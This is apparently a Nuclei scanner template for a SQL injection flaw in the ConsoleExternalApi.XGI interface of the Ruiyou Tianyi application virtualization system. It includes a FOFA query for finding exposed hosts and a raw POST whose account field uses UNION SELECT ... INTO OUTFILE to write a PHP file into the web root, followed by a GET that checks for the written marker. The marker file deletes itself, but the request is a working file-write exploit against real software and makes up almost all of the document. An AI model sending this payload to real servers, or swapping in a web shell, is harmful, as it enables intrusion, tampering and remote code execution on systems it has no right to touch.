id: ruiyou-tianyi-consoleexternalapixgi-sqli

info:
  name: "瑞友天翼虚拟化系统 ConsoleExternalApi.XGI 接口 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="瑞友天翼－应用虚拟化系统"
      瑞友天翼虚拟化系统在ConsoleExternalApi.XGI接口中存在SQL注入漏洞，攻击者可通过构造恶意SQL语句执行非授权数据库操作，包括但不限于数据篡改、删除及记录修改，导致数据库完整性受损。
  tags: 瑞友天翼虚拟化系统

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde HTTP/1.1
    Host: {{Hostname}}
    Cookie: PHPSESSID=t50ep2hj6cj7cvoitlrp7noop7; CookieLanguageName=ZH-CN; think_language=zh-CN; UserAuthtype=0
    Accept-Encoding: gzip
    Content-Type: application/json

    {
    "account": "1' union select '<?php echo \"NdayTest\";unlink(__FILE__); ?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\NTest.xgi'#",
    "userPwd": "1"
    }
- raw:
  - |
    GET /NTest.xgi HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
